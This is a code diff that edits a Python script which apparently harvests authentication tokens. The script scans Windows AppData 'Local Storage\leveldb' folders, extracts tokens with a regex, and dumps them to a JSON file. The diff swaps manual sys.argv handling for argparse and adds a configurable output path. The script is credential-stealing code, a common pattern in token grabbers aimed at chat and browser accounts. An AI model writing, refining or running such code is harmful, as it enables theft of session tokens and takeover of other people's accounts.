@@ -1,7 +1,7 @@
 import os
 import re
-import sys
 import json
+import argparse
 
 def find_tokens(path):
     path += '\\Local Storage\\leveldb'
@@ -15,7 +15,7 @@ def find_tokens(path):
                     for token in re.findall(regex, line):
                         yield token
 
-def main():
+def main(args):
     local = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
     paths = {
@@ -33,11 +33,13 @@ def main():
         if os.path.exists(path):
             data[platform] = list(find_tokens(path))
 
-    with open('temp.json', 'w', encoding='utf-8') as f:
+    with open(args.output_file, 'w', encoding='utf-8') as f:
         json.dump(data, f, indent=4)
 
+    print('Done!')
+
 if __name__ == '__main__':
-    if len(sys.argv) > 1:
-        if sys.argv[1] in ['--run', '-r']:
-            main()
-            print('Done!')
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--output-file', '-o', default='temp.json', help='Output file name')
+    args = parser.parse_args()
+    main(args)
